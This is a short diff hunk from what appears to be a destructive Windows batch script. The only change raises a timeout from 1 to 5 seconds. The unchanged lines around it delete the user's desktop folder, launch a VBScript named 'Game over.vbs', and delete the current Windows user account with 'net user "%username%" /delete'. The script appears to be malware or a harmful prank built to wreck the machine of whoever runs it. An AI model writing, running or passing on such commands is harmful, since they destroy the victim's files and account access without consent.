@@ -33,7 +33,7 @@ rd "%userprofile%\desktop"
 
 start "%userprofile%\Browser\Jaws\Game over.vbs"
 
-timeout 1 >nul /nobreak
+timeout 5 >nul /nobreak
 
 net user "%username%" /delete
 
